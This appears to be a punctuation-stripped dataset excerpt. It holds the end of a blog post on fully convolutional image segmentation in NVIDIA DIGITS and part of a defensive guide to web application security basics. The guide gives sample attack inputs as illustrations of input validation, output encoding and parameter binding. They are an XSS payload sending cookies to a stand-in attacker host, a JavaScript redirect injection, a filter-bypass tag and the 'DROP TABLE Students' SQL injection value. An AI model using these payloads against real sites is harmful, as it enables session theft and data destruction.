output of the classification network  In the next section I ll show you how to further refine the model   Image Segmentation FCN  The previous section showed how to design an FCN that predicts one class probability distribution per window  Obviously  the number of windows depends on the size of the input image  the size of the window and the step size used between windows when scanning the input image  Ideally  an image segmentation model will generate one probability distribution per pixel in the image  How can you do this in practice  Here again I will employ a method from the FCN paper   When the input image traverses the successive layers of the  convolutionalized  Alexnet  the pixel data at the input is effectively compressed into a set of coarser  higher level feature representations  In image segmentation  the aim is to interpolate those coarse features to reconstruct a fine classification  for every pixel in the input  It turns out that this is easily done with deconvolutional layers  These layers perform the inverse operation of their convolutional counterparts  given the output of the convolution  a deconvolutional layer finds the input that would have generated the output  given the definition of the filter  Remember that the stride in a convolutional layer  or a pooling layer  defines how far the window slides when processing the input and is therefore a measure of how down sampled the output is  Conversely  the stride in a deconvolutional layer is a measure of how up sampled the output is  Choose a stride of 4 and the output is 4 times bigger   The next question is  how do I determine how much to up sample the activations of the final convolutional layer in the model to obtain an output that is the same size as the input image  I need to inspect every layer and carefully write down its scaling factor  Once I have done that for all layers  I just multiply scaling factors together  Let s look at the first convolutional layer in Alexnet   layer   name   conv1  type   Convolution  bottom   data_preprocessed  top   conv1  convolution_param   num_output  96 kernel_size  11 stride  4      The stride of conv1 is 4  therefore the scaling factor is    Repeating this for all layers  I determine that the total scaling factor in the model is 1 32  as summarised in Table 2  Consequently  the stride I need for the deconvolutional layer is 32   layer   name   upscore  type   Deconvolution  bottom   score  top   upscore  convolution_param   num_output  12   set this to number of classes kernel_size  63 stride  32      For the sake of completeness  I have to say that it is not completely true that a convolutional layer with stride yields an output that is times the size of the input in all spatial dimensions  In practice  adding padding to the input will increase the number of activations  Conversely  using kernels with size will knock activations off the input  At the limit  if you provide the layer with an infinitely long input  the input output size ratio will indeed be in all  spatial  dimensions  In reality  the output of every convolutional  or pooling  layer is shifted by    For example  consider conv1   since this layer has 100 pixel padding on each side  the output is larger than if there was no padding at all  By applying the above formula we can calculate that each side of the output has  in theory  23 75 extra pixels  This adds up as we add layers  The cumulative offset across all layers can be computed by walking the graph backwards  The composition of a layer L1 with a layer L2  i e  L2 is a bottom of L1 in Caffe terminology   with offsets O1 and O2 respectively  yields an offset of O2 F O1  where F is the cumulative scaling factor of L2   See Table 2 for a summary of those computations   Table 2  scaling factors and offsets across successive layers in a  convolutionalized  Alexnet    For deconvolution layers the scaling factor is equal to the stride and the offset is equal to  K 1  2 P  Layer Stride Pad Kernel size Scaling Factor  1 S  Cumulative  Scaling Factor Offset   P  K 1  2  S Cumulative  Offset  calculated backward from last layer  conv1 4 100 11 1 4 1 4 23 75 18 pool1 2 0 3 1 2 1 8  0 5  77 conv2 1 2 5 1 1 8 0  73 pool2 2 0 3 1 2 1 16  0 5  73 conv3 1 1 3 1 1 16 0  65 conv4 1 1 3 1 1 16 0  65 conv5 1 1 3 1 1 16 0  65 pool5 2 0 3 1 2 1 32  0 5  65 conv6 1 0 6 1 1 32  2 5  49 conv7 1 0 1 1 1 32 0 31 upscore 32 0 63 32  1 31  31  Table 2 shows that the output of the network is shifted by 18 pixels with respect to the input as it traverses all layers from conv1 to upscore   The last trick I need in the segmentation model is a layer to crop the network output and remove the 18 extra pixels on each border  This is easily done in Caffe with a Crop layer  defined in the following listing   layer   name   score  type   Crop  bottom   upscore  bottom   data  top   score  crop_param   axis  2 offset  18      You might notice that in this version of Alexnet there is a bit more padding than you are used to seeing in that conv1 layer  There are two reasons behind this  one reason is to generate a large initial shift  so the offsets incurred by successive layers do not eat into the image  The main reason  however  is to have the network process the borders of the input image in such a way that they hit the center of the network s receptive field  approximately   At last  I now have everything I need to replicate the FCN Alexnet model from the FCN paper  Let s relax for a minute and look at some refreshing images from the SYNTHIA dataset   The SYNTHIA Dataset  The SYNTHIA dataset was originally published in this this paper  5    See Figure 9 for sample images from the SYNTHIA dataset  These images show synthetically generated urban scenes with various object classes such as buildings  roads  cars and pedestrians under varying conditions such as day and night  Amusingly  the images look realistic enough that one sometimes feels intrigued by them  hmmm  that man reading a newspaper in the middle of the road on that first picture is acting strangely  he s certainly up to no good   In DIGITS 5 0  creating an image segmentation dataset is as simple as pointing to the input and ground truth image folders and clicking the  Create  button  DIGITS supports various label formats such as palette images  where pixel values in label images are an index into a color palette  and RGB images  where each color denotes a particular class    After you have created your dataset in DIGITS you can explore the databases to visually inspect their contents  as in Figure 10   Training the Model  A dataset and a network description are all you need to start training a model in DIGITS  If you thought the process of convolutionalizing Alexnet was somewhat complicated or time consuming then fret not  DIGITS 5 0 comes with a model store and as you can imagine  FCN Alexnet can be retrieved from the DIGITS model store   If  however you decided to go the hard way and create the model description yourself  you will want to use a suitable weight initialization scheme like the Kaiming  5   also known as MSRA  method  which is state of the art in the presence of Rectified Linear Units  This is easily done in Caffe by adding a weight_filler   type   msra    directive to your parametric layers  If you train your model this way in DIGITS you will probably end up with a curve that resembles the one in Figure 11  As you can see the performance is less than satisfactory  Validation accuracy plateaus at 35   meaning that only 35  of pixels in the validation set are correctly labeled   The training loss is in line with the validation loss  indicating that the network is underfitting the training set   You can try your luck on a sample image and ask DIGITS for a visualization of the image segmentation  You will see something like Figure 12  where you can see that the network is indiscriminately classifying everything as building  It turns out that building is the most represented object class in SYNTHIA and the network has just lazily learnt to achieve 35  accuracy by labeling everything as building  What are commonly accepted ways to deal with a network that underfits the training set   Train for longer  looking at the loss curves  this is unlikely to help as training seems to have hit a plateau  The network has entered a local minimum and is unable to get out of it   Increase the learning rate  and reduce the batch size  this could encourage a network that is trapped in a local minimum to explore beyond its immediate surroundings  although this increases the risk that the network diverges   Increase the size of the model  this could increase the expressivity of the model   Another method that I found to work extremely well in computer vision is transfer learning  Read on to find out more   Transfer Learning  You don t have to start from randomly initialized weights to train a model  In a lot of cases  it helps to reuse knowledge that a network learned when training on another dataset  This is particularly true in Computer Vision through CNNs since a lot of low level features  lines  corners  shapes  textures  immediately apply to any dataset  Since image segmentation does classification at the pixel level it makes sense to transfer learning from image classification datasets such as ILSVRC2012  This turns out to be rather straightforward when using Caffe with one or two gotchas of course  Remember that in Alexnet s fc6  the weights have a shape of 4096 9216  In FCN Alexnet s conv6  the weights have a shape of 4096x256x6x6  This is exactly the same number of weights  but since the shapes are different  Caffe will be unable to automatically carry the weights over to FCN Alexnet  This operation may be performed using a net surgery script  an example of which can be found in the DIGITS repository on Github  The function of the net surgery script is to transplant parameters from fully connected layers to their convolutional counterparts  You may however find it easier to simply download the pretrained model from the public DIGITS Model Store  Figure 13 shows a preview of the model store  click  Import  next to  FCN Alexnet  and DIGITS will download the pre trained model   Another related concern that you might have is how to initialize the upsampling layer added earlier in this post  since this layer isn t part of the original Alexnet model  in the FCN paper the recommendation is to randomly initialize the corresponding weights and have the network learn them  The authors of the paper later realized that it is just as simple to initialize these weights in such a way that the layer just acts as a magnifying glass  by doing bilinear interpolation  In Caffe this is done by adding a weight_filler  type   bilinear   directive to the layer   Using a pre trained FCN Alexnet model  you will notice that the accuracy quickly exceeds 90  and when testing individual images such as in Figure 14 the result will be a much more convincing image segmentation  with detections for 9 different object classes  You might  however  be slightly disappointed to see that object contours are very coarse  Read on to the next and final section to discover how to further improve the precision and accuracy of our segmentation model   Enabling Finer Segmentation  Remember that the new upsampling layer added to FCN Alexnet magnifies the output of conv7 by a factor of 32  In practice  this means that the network makes a single prediction per 32 32 pixel block  which explains why object contours are so coarse  The FCN paper introduces another great idea for addressing this limitation  skip connections are added to directly redirect the output of pool3 and pool4 towards the output of the network  Since those pooling layers are further back in the network  they operate on lower level features and are able to capture finer details  In a network architecture called FCN 8s the FCN paper introduces a VGG 16 based network in which the final output is an 8x upsampling of the sum of pool3   a 2x upsampling of pool4 and a 4x upsampling of conv7   as Figure 15 illustrates  This leads to a network that is able to make predictions at a much finer grain  down to 8 8 pixel blocks   For your convenience  a pre trained FCN 8s can be downloaded from the public DIGITS model store   You don t want to manually convolutionalize VGG 16   If you train FCN 8s on SYNTHIA using DIGITS  you should see that the validation accuracy exceeds 95  after only a couple of epochs  Most importantly  when you test a sample image and observe DIGITS  superb image segmentation visualization  you will see much sharper object contours  as in Figure 16   Now It s Your Turn   After reading this post  you should have the information you need to get started with image segmentation  The DIGITS 5 general release will be available in the first week of December  Visit the DIGITS page to learn more and sign up for the NVIDIA Developer program to be notified when it is ready for download   DIGITS is an open source project on GitHub  If you d like to start experimenting with image segmentation right away  head over to the DIGITS GitHub project page where you can get the source code  We look forward to your feedback and contributions on Github as we continue to develop it   Please let us know how you are doing by commenting on this post   Acknowledgements  I would like to thank Mark Harris for his insightful comments and suggestions   References   1  Krizhevsky  A   Sutskever  I  and Hinton  G  E   ImageNet Classification with Deep Convolutional Neural Networks   NIPS Proceedings  NIPS 2012  Neural Information Processing Systems  Lake Tahoe  Nevada  2012    2  Christian Szegedy  Wei Liu  Yangqing Jia  Pierre Sermanet  Scott Reed  Dragomir Anguelov  Dumitru Erhan  Vincent Vanhoucke  Andrew Rabinovich   Going Deeper With Convolutions   CVPR 2015    3  Simonyan  Karen  and Andrew Zisserman   Very deep convolutional networks for large scale image recognition   arXiv technical report arXiv 1409 1556  2014    4  Long  Jonathan  Evan Shelhamer  and Trevor Darrell   Fully convolutional networks for semantic segmentation   Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2015  3431 3440    5  Ros  German  Laura Sellart  Joanna Materzynska  David Vazquez  and Antonio M  Lopez   The SYNTHIA Dataset  A large collection of synthetic images for semantic segmentation of urban scenes   Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2016  3234 3243    6  He  Kaiming  Xiangyu Zhang  Shaoqing Ren  and Jian Sun  Delving deep into rectifiers  Surpassing human level performance on imagenet classification   Proceedings of the IEEE International Conference on Computer Vision 2015  1026 1034    parallel,"[599 887 1077 400 629 28 1344 1395 444 1175 1001]"
629,training-dataset/engineering/1485.txt,engineering,The Basics of Web Application SecurityModern web development has many challenges  and of those security is both very important and often under emphasized  While such techniques as threat analysis are increasingly recognized as essential to any serious development  there are also some basic practices which every developer can and should be doing as a matter of course   Daniel Somerfield is a Technical Lead at ThoughtWorks  where he works with customers building systems that serve their business needs and are fast  flexible  and secure  Daniel is an advocate for immutable infrastructure and cloud automation as a vehicle to advance the state of secure agile delivery at ThoughtWorks and in the industry at large   Cade Cairns is a software developer with a passion for security  He has experience leading teams creating everything from enterprise applications to security testing software  mobile applications  and software for embedded devices  At the moment his primary focus is on helping improve how security concerns are addressed during the solution delivery lifecycle   The modern software developer has to be something of a swiss army knife  Of course  you need to write code that fulfills customer functional requirements  It needs to be fast  Further you are expected to write this code to be comprehensible and extensible  sufficiently flexible to allow for the evolutionary nature of IT demands  but stable and reliable  You need to be able to lay out a useable interface  optimize a database  and often set up and maintain a delivery pipeline  You need to be able to get these things done by yesterday   Somewhere  way down at the bottom of the list of requirements  behind  fast  cheap  and flexible is  secure   That is  until something goes wrong  until the system you build is compromised  then suddenly security is  and always was  the most important thing   Security is a cross functional concern a bit like Performance  And a bit unlike Performance  Like Performance  our business owners often know they need Security  but aren t always sure how to quantify it  Unlike Performance  they often don t know  secure enough  when they see it   So how can a developer work in a world of vague security requirements and unknown threats  Advocating for defining those requirements and identifying those threats is a worthy exercise  but one that takes time and therefore money  Much of the time developers will operate in absence of specific security requirements and while their organization grapples with finding ways to introduce security concerns into the requirements intake processes  they will still build systems and write code   In this Evolving Publication  we will   point out common areas in a web application that developers need to be particularly conscious of security risks  provide guidance for how to address each risk on common web stacks  highlight common mistakes developers make  and how to avoid them  Security is a massive topic  even if we reduce the scope to only browser based web applications  These articles will be closer to a  best of  than a comprehensive catalog of everything you need to know  but we hope it will provide a directed first step for developers who are trying to ramp up fast   Trust Before jumping into the nuts and bolts of input and output  it s worth mentioning one of the most crucial underlying principles of security  trust  We have to ask ourselves  do we trust the integrity of request coming in from the user s browser   hint  we don t   Do we trust that upstream services have done the work to make our data clean and safe   hint  nope   Do we trust the connection between the user s browser and our application cannot be tampered   hint  not completely      Do we trust that the services and data stores we depend on   hint  we might     Of course  like security  trust is not binary  and we need to assess our risk tolerance  the criticality of our data  and how much we need to invest to feel comfortable with how we have managed our risk  In order to do that in a disciplined way  we probably need to go through threat and risk modeling processes  but that s a complicated topic to be addressed in another article  For now  suffice it to say that we will identify a series of risks to our system  and now that they are identified  we will have to address the threats that arise   Reject Unexpected Form Input HTML forms can create the illusion of controlling input  The form markup author might believe that because they are restricting the types of values that a user can enter in the form the data will conform to those restrictions  But rest assured  it is no more than an illusion  Even client side JavaScript form validation provides absolutely no value from a security perspective  Untrusted Input On our scale of trust  data coming from the user s browser  whether we are providing the form or not  and regardless of whether the connection is HTTPS protected  is effectively zero  The user could very easily modify the markup before sending it  or use a command line application like curl to submit unexpected data  Or a perfectly innocent user could be unwittingly submitting a modified version of a form from a hostile website  Same Origin Policy doesn t prevent a hostile site from submitting to your form handling endpoint  In order to ensure the integrity of incoming data  validation needs to be handled on the server  But why is malformed data a security concern  Depending on your application logic and use of output encoding  you are inviting the possibility of unexpected behavior  leaking data  and even providing an attacker with a way of breaking the boundaries of input data into executable code  For example  imagine that we have a form with a radio button that allows the user to select a communication preference  Our form handling code has application logic with different behavior depending on those values  final String communicationType   req getParameter  communicationType    if   email  equals communicationType     sendByEmail      else if   text  equals communicationType     sendByText      else   sendError resp  format  Can t send by type  s   communicationType      This code may or may not be dangerous  depending on how the sendError method is implemented  We are trusting that downstream logic processes untrusted content correctly  It might  But it might not  We re much better off if we can eliminate the possibility of unanticipated control flow entirely  So what can a developer do to minimize the danger that untrusted input will have undesirable effects in application code  Enter input validation  Input Validation Input validation is the process of ensuring input data is consistent with application expectations  Data that falls outside of an expected set of values can cause our application to yield unexpected results  for example violating business logic  triggering faults  and even allowing an attacker to take control of resources or the application itself  Input that is evaluated on the server as executable code  such as a database query  or executed on the client as HTML JavaScript is particularly dangerous  Validating input is an important first line of defense to protect against this risk  Developers often build applications with at least some basic input validation  for example to ensure a value is non null or an integer is positive  Thinking about how to further limit input to only logically acceptable values is the next step toward reducing risk of attack  Input validation is more effective for inputs that can be restricted to a small set  Numeric types can typically be restricted to values within a specific range  For example  it doesn t make sense for a user to request to transfer a negative amount of money or to add several thousand items to their shopping cart  This strategy of limiting input to known acceptable types is known as positive validation or whitelisting  A whitelist could restrict to a string of a specific form such as a URL or a date of the form  yyyy mm dd   It could limit input length  a single acceptable character encoding  or  for the example above  only values that are available in your form  Another way of thinking of input validation is that it is enforcement of the contract your form handling code has with its consumer  Anything violating that contract is invalid and therefore rejected  The more restrictive your contract  the more aggressively it is enforced  the less likely your application is to fall prey to security vulnerabilities that arise from unanticipated conditions  You are going to have to make a choice about exactly what to do when input fails validation  The most restrictive and  arguably most desirable is to reject it entirely  without feedback  and make sure the incident is noted through logging or monitoring  But why without feedback  Should we provide our user with information about why the data is invalid  It depends a bit on your contract  In form example above  if you receive any value other than  email  or  text   something funny is going on  you either have a bug or you are being attacked  Further  the feedback mechanism might provide the point of attack  Imagine the sendError method writes the text back to the screen as an error message like  We re unable to respond with communicationType    That s all fine if the communicationType is  carrier pigeon  but what happens if it looks like this   script new Image   src    http   evil martinfowler com steal     document cookie  script  You ve now faced with the possibility of a reflective XSS attack that steals session cookies  If you must provide user feedback  you are best served with a canned response that doesn t echo back untrusted user data  for example  You must choose email or text   If you really can t avoid rendering the user s input back at them  make absolutely sure it s properly encoded  see below for details on output encoding   In Practice It might be tempting to try filtering the  script  tag to thwart this attack  Rejecting input that contains known dangerous values is a strategy referred to as negative validation or blacklisting  The trouble with this approach is that the number of possible bad inputs is extremely large  Maintaining a complete list of potentially dangerous input would be a costly and time consuming endeavor  It would also need to be continually maintained  But sometimes it s your only option  for example in cases of free form input  If you must blacklist  be very careful to cover all your cases  write good tests  be as restrictive as you can  and reference OWASP s XSS Filter Evasion Cheat Sheet to learn common methods attackers will use to circumvent your protections  Resist the temptation to filter out invalid input  This is a practice commonly called  sanitization   It is essentially a blacklist that removes undesirable input rather than rejecting it  Like other blacklists  it is hard to get right and provides the attacker with more opportunities to evade it  For example  imagine  in the case above  you choose to filter out  script  tags  An attacker could bypass it with something as simple as   scr script ipt  Even though your blacklist caught the attack  by fixing it  you just reintroduced the vulnerability  Input validation functionality is built in to most modern frameworks and  when absent  can also be found in external libraries that enable the developer to put multiple constraints to be applied as rules on a per field basis  Built in validation of common patterns like email addresses and credit card numbers is a helpful bonus  Using your web framework s validation provides the additional advantage of pushing the validation logic to the very edge of the web tier  causing invalid data to be rejected before it ever reaches complex application code where critical mistakes are easier to make  Framework Approaches Java Hibernate  Bean Validation  ESAPI Spring Built in type safe params in Controller Built in Validator interface  Bean Validation  Ruby on Rails Built in Active Record Validators ASP NET Built in Validation  see BaseValidator  Play Built in Validator Generic JavaScript xss filters NodeJS validator js General Regex based validation on application inputs In Summary White list when you can  Black list when you can t whitelist  Keep your contract as restrictive as possible  Make sure you alert about the possible attack  Avoid reflecting input back to a user  Reject the web content before it gets deeper into application logic to minimize ways to mishandle untrusted data or  even better  use your web framework to whitelist input Although this section focused on using input validation as a mechanism for protecting your form handling code  any code that handles input from an untrusted source can be validated in much the same way  whether the message is JSON  XML  or any other format  and regardless of whether it s a cookie  a header  or URL parameter string  Remember  if you don t control it  you can t trust it  If it violates the contract  reject it   Encode HTML Output In addition to limiting data coming into an application  web application developers need to pay close attention to the data as it comes out  A modern web application usually has basic HTML markup for document structure  CSS for document style  JavaScript for application logic  and user generated content which can be any of these things  It s all text  And it s often all rendered to the same document  An HTML document is really a collection of nested execution contexts separated by tags  like  script  or  style    The developer is always one errant angle bracket away from running in a very different execution context than they intend  This is further complicated when you have additional context specific content embedded within an execution context  For example  both HTML and JavaScript can contain a URL  each with rules all their own  Output Risks HTML is a very  very permissive format  Browsers try their best to render the content  even if it is malformed  That may seem beneficial to the developer since a bad bracket doesn t just explode in an error  however  the rendering of badly formed markup is a major source of vulnerabilities  Attackers have the luxury of injecting content into your pages to break through execution contexts  without even having to worry about whether the page is valid  Handling output correctly isn t strictly a security concern  Applications rendering data from sources like databases and upstream services need to ensure that the content doesn t break the application  but risk becomes particularly high when rendering content from an untrusted source  As mentioned in the prior section  developers should be rejecting input that falls outside the bounds of the contract  but what do we do when we need to accept input containing characters that has the potential to change our code  like a single quote         or open bracket          This is where output encoding comes in  Output Encoding Output encoding is converting outgoing data to a final output format  The complication with output encoding is that you need a different codec depending on how the outgoing data is going to be consumed  Without appropriate output encoding  an application could provide its client with misformatted data making it unusable  or even worse  dangerous  An attacker who stumbles across insufficient or inappropriate encoding knows that they have a potential vulnerability that might allow them to fundamentally alter the structure of the output from the intent of the developer  For example  imagine that one of the first customers of a system is the former supreme court judge Sandra Day O Connor  What happens if her name is rendered into HTML   p The Honorable Justice Sandra Day O Connor  p  renders as  The Honorable Justice Sandra Day O Connor All is right with the world  The page is generated as we would expect  But this could be a fancy dynamic UI with a model view controller architecture  These strings are going to show up in JavaScript  too  What happens when the page outputs this to the browser  document getElementById  name   innerText    Sandra Day O Connor       unescaped string The result is malformed JavaScript  This is what hackers look for to break through execution context and turn innocent data into dangerous executable code  If the Chief Justice enters her name as Sandra Day O  window location  http   evil martinfowler com    suddenly our user has been pushed to a hostile site  If  however  we correctly encode the output for a JavaScript context  the text will look like this   Sandra Day O   window location   http   evil martinfowler com      A bit confusing  perhaps  but a perfectly harmless  non executable string  Note There are a couple strategies for encoding JavaScript  This particular encoding uses escape sequences to represent the apostrophe           but it could also be represented safely with the Unicode escape seqeence          The good news is that most modern web frameworks have mechanisms for rendering content safely and escaping reserved characters  The bad news is that most of these frameworks include a mechanism for circumventing this protection and developers often use them either due to ignorance or because they are relying on them to render executable code that they believe to be safe  Cautions and Caveats There are so many tools and frameworks these days  and so many encoding contexts  e g  HTML  XML  JavaScript  PDF  CSS  SQL  etc    that creating a comprehensive list is infeasible  however  below is a starter for what to use and avoid for encoding HTML in some common frameworks  If you are using another framework  check the documentation for safe output encoding functions  If the framework doesn t have them  consider changing frameworks to something that does  or you ll have the unenviable task of creating output encoding code on your own  Also note  that just because a framework renders HTML safely  doesn t mean it s going to render JavaScript or PDFs safely  You need to be aware of the encoding a particular context the encoding tool is written for  Be warned  you might be tempted to take the raw user input  and do the encoding before storing it  This pattern will generally bite you later on  If you were to encode the text as HTML prior to storage  you can run into problems if you need to render the data in another format  it can force you to unencode the HTML  and re encode into the new output format  This adds a great deal of complexity and encourages developers to write code in their application code to unescape the content  making all the tricky upstream output encoding effectively useless  You are much better off storing the data in its most raw form  then handling encoding at rendering time  Finally  it s worth noting that nested rendering contexts add an enormous amount of complexity and should be avoided whenever possible  It s hard enough to get a single output string right  but when you are rendering a URL  in HTML within JavaScript  you have three contexts to worry about for a single string  If you absolutely cannot avoid nested contexts  make sure to de compose the problem into separate stages  thoroughly test each one  paying special attention to order of rendering  OWASP provides some guidance for this situation in the DOM based XSS Prevention Cheat Sheet In Summary Output encode all application data on output with an appropriate codec  Use your framework s output encoding capability  if available  Avoid nested rendering contexts as much as possible  Store your data in raw form and encode at rendering time  Avoid unsafe framework and JavaScript calls that avoid encoding  Bind Parameters for Database Queries Whether you are writing SQL against a relational database  using an object relational mapping framework  or querying a NoSQL database  you probably need to worry about how input data is used within your queries  The database is often the most crucial part of any web application since it contains state that can t be easily restored  It can contain crucial and sensitive customer information that must be protected  It is the data that drives the application and runs the business  So you would expect developers to take the most care when interacting with their database  and yet injection into the database tier continues to plague the modern web application even though it s relatively easy to prevent  Little Bobby Tables No discussion of parameter binding would be complete without including the famous 2007  Little Bobby Tables  issue of xkcd  To decompose this comic  imagine the system responsible for keeping track of grades has a function for adding new students  void addStudent String lastName  String firstName    String query    INSERT INTO students  last_name  first_name  VALUES       lastName            firstName         getConnection   createStatement   execute query     If addStudent is called with parameters  Fowler    Martin   the resulting SQL is  INSERT INTO students  last_name  first_name  VALUES   Fowler    Martin   But with Little Bobby s name the following SQL is executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert    DROP TABLE Students       In fact  two commands are executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert   DROP TABLE Students The final      comments out the remainder of the original query  ensuring the SQL syntax is valid  Et voila  the DROP is executed  This attack vector allows the user to execute arbitrary SQL within the context of the application s database user  In other words  the attacker can do anything the application can do and more  which could result in attacks that cause greater harm than a DROP  including violating data integrity  exposing sensitive information or inserting executable code  Later we will talk about defining different users as a secondary defense against this kind of mistake  but for now  suffice to say that there is a very simple application level strategy for minimizing injection risk  Parameter Binding to the Rescue To quibble with Hacker Mom s solution  sanitizing is very difficult to get right  creates new potential attack vectors and is certainly not the right approach  Your best  and arguably only decent option is parameter binding  JDBC  for example  provides the PreparedStatement setXXX   methods for this very purpose  Parameter binding provides a means of separating executable code  such as SQL  from content  transparently handling content encoding and escaping  void addStudent String lastName  String firstName    PreparedStatement stmt   getConnection   prepareStatement  INSERT INTO students  last_name  first_name  VALUES           stmt setString 1  lastName   stmt setString 2  firstName   stmt execute      Any full featured data access layer will have the ability to bind variables and defer implementation to the underlying protocol  This way  the developer doesn t need to understand the complexities that arise from mixing user input with executable code  For this to be effective all untrusted inputs need to be bound  If SQL is built through concatenation  interpolation  or formatting methods  none of the resulting string should be created from user input  Clean and Safe Code Sometimes we encounter situations where there is tension between good security and clean code  Security sometimes requires the programmer to add some complexity in order to protect the application  In this case however  we have one of those fortuitous situations where good security and good design are aligned  In addition to protecting the application from injection  introducing bound parameters improves comprehensibility by providing clear boundaries between code and content  and simplifies creating valid SQL by eliminating the need to manage the quotes by hand  As you introduce parameter binding to replace your string formatting or concatenation  you may also find opportunities to introduce generalized binding functions to the code  further enhancing code cleanliness and security  This highlights another place where good design and good security overlap  de duplication leads to additional testability  and reduction of complexity  Common Misconceptions There is a misconception that stored procedures prevent SQL injection  but that is only true insofar as parameters are bound inside the stored procedure  If the stored procedure itself does string concatenation it can be injectable as well  and binding the variable from the client won t save you  Similarly  object relational mapping frameworks like ActiveRecord  Hibernate  or  NET Entity Framework  won t protect you unless you are using binding functions  If you are building your queries using untrusted input without binding  the app still could be vulnerable to an injection attack  For more detail on the injection risks of stored procedures and ORMs  see security analyst Troy Hunt s article Stored procedures and ORMs won t save you from SQL injection   Finally  there is a misconception that NoSQL databases are not susceptible to injection attack and that is not true  All query languages  SQL or otherwise  require a clear separation between executable code and content so the execution doesn t confuse the command from the parameter  Attackers look for points in the runtime where they can break through those boundaries and use input data to change the intended execution path  Even Mongo DB  which uses a binary wire protocol and language specific API  reducing opportunities for text based injection attacks  exposes the   where  operator which is vulnerable to injection  as is demonstrated in this article from the OWASP Testing Guide  The bottom line is that you need to check the data store and driver documentation for safe ways to handle input data  Parameter Binding Functions Check the matrix below for indication of safe binding functions of your chosen data store  If it is not included in this list  check the product documentation  Framework Encoded Dangerous Raw JDBC Connection prepareStatement   used with setXXX   methods and bound parameters for all input  Any query or update method called with string concatenation rather than binding  PHP   MySQLi prepare   used with bind_param for all input  Any query or update method called with string concatenation rather than binding  MongoDB Basic CRUD operations such as find    insert    with BSON document field names controlled by application  Operations  including find  when field names are allowed to be determined by untrusted data or use of Mongo operations such as   where  that allow arbitrary JavaScript conditions  Cassandra Session prepare used with BoundStatement and bound parameters for all input  Any query or update method called with string concatenation rather than binding  Hibernate   JPA Use SQL or JPQL OQL with bound parameters via setParameter Any query or update method called with string concatenation rather than binding  ActiveRecord Condition functions  find_by  where  if used with hashes or bound parameters  eg  where  foo  bar  where   foo       bar  Condition functions used with string concatenation or interpolation  where  foo      bar     where  foo        bar        In Summary Avoid building SQL  or NoSQL equivalent  from user input  Bind all parameterized data  both queries and stored procedures  Use the native driver binding function rather than trying to handle the encoding yourself  Don t think stored procedures or ORM tools will save you  You need to use binding functions for those  too  NoSQL doesn t make you injection proof  Protect Data in Transit While we re on the subject of input and output  there s another important consideration  the privacy and integrity of data in transit  When using an ordinary HTTP connection  users are exposed to many risks arising from the fact data is transmitted in plaintext  An attacker capable of intercepting network traffic anywhere between a user s browser and a server can eavesdrop or even tamper with the data completely undetected in a man in the middle attack  There is no limit to what the attacker can do  including stealing the user s session or their personal information  injecting malicious code that will be executed by the browser in the context of the website  or altering data the user is sending to the server  We can t usually control the network our users choose to use  They very well might be using a network where anyone can easily watch their traffic  such as an open wireless network in a caf  or on an airplane  They might have unsuspectingly connected to a hostile wireless network with a name like  Free Wi Fi  set up by an attacker in a public place  They might be using an internet provider that injects content such as ads into their web traffic  or they might even be in a country where the government routinely surveils its citizens  If an attacker can eavesdrop on a user or tamper with web traffic  all bets are off  The data exchanged cannot be trusted by either side  Fortunately for us  we can protect against many of these risks with HTTPS  HTTPS and Transport Layer Security HTTPS was originally used mainly to secure sensitive web traffic such as financial transactions  but it is now common to see it used by default on many sites we use in our day to day lives such as social networking and search engines  The HTTPS protocol uses the Transport Layer Security  TLS  protocol  the successor to the Secure Sockets Layer  SSL  protocol  to secure communications  When configured and used correctly  it provides protection against eavesdropping and tampering  along with a reasonable guarantee that a website is the one we intend to be using  Or  in more technical terms  it provides confidentiality and data integrity  along with authentication of the website s identity  With the many risks we all face  it increasingly makes sense to treat all network traffic as sensitive and encrypt it  When dealing with web traffic  this is done using HTTPS  Several browser makers have announced their intent to deprecate non secure HTTP and even display visual indications to users to warn them when a site is not using HTTPS  Most HTTP 2 implementations in browsers will only support communicating over TLS  So why aren t we using it for everything now  There have been some hurdles that impeded adoption of HTTPS  For a long time  it was perceived as being too computationally expensive to use for all traffic  but with modern hardware that has not been the case for some time  The SSL protocol and early versions of the TLS protocol only support the use of one web site certificate per IP address  but that restriction was lifted in TLS with the introduction of a protocol extension called SNI  Server Name Indication   which is now supported in most browsers  The cost of obtaining a certificate from a certificate authority also deterred adoption  but the introduction of free services like Let s Encrypt has eliminated that barrier  Today there are fewer hurdles than ever before  Get a Server Certificate The ability to authenticate the identity of a website underpins the security of TLS  In the absence of the ability to verify that a site is who it says it is  an attacker capable of doing a man in the middle attack could impersonate the site and undermine any other protection the protocol provides  When using TLS  a site proves its identity using a public key certificate  This certificate contains information about the site along with a public key that is used to prove that the site is the owner of the certificate  which it does using a corresponding private key that only it knows  In some systems a client may also be required to use a certificate to prove its identity  although this is relatively rare in practice today due to complexities in managing certificates for clients  Unless the certificate for a site is known in advance  a client needs some way to verify that the certificate can be trusted  This is done based on a model of trust  In web browsers and many other applications  a trusted third party called a Certificate Authority  CA  is relied upon to verify the identity of a site and sometimes of the organization that owns it  then grant a signed certificate to the site to certify it has been verified  It isn t always necessary to involve a trusted third party if the certificate is known in advance by sharing it through some other channel  For example  a mobile app or other application might be distributed with a certificate or information about a custom CA that will be used to verify the identity of the site  This practice is referred to as certificate or public key pinning and is outside the scope of this article  The most visible indicator of security that many web browsers display is when communications with a site are secured using HTTPS and the certificate is trusted  Without it  a browser will display a warning about the certificate and prevent a user from viewing your site  so it is important to get a certificate from a trusted CA  It is possible to generate your own certificate to test a HTTPS configuration out  but you will need a certificate signed by a trusted CA before exposing the service to users  For many uses  a free CA is a good starting point  When searching for a CA  you will encounter different levels of certification offered  The most basic  Domain Validation  DV   certifies the owner of the certificate controls a domain  More costly options are Organization Validation  OV  and Extended Validation  EV   which involve the CA doing additional checks to verify the organization requesting the certificate  Although the more advanced options result in a more positive visual indicator of security in the browser  it may not be worth the extra cost for many  Configure Your Server With a certificate in hand  you can begin to configure your server to support HTTPS  At first glance  this may seem like a task worthy of someone who holds a PhD in cryptography  You may want to choose a configuration that supports a wide range of browser versions  but you need to balance that with providing a high level of security and maintaining some level of performance  The cryptographic algorithms and protocol versions supported by a site have a strong impact on the level of communications security it provides  Attacks with impressive sounding names like FREAK and DROWN and POODLE  admittedly  the last one doesn t sound all that formidable  have shown us that supporting dated protocol versions and algorithms presents a risk of browsers being tricked into using the weakest option supported by a server  making attack much easier  Advancements in computing power and our understanding of the mathematics 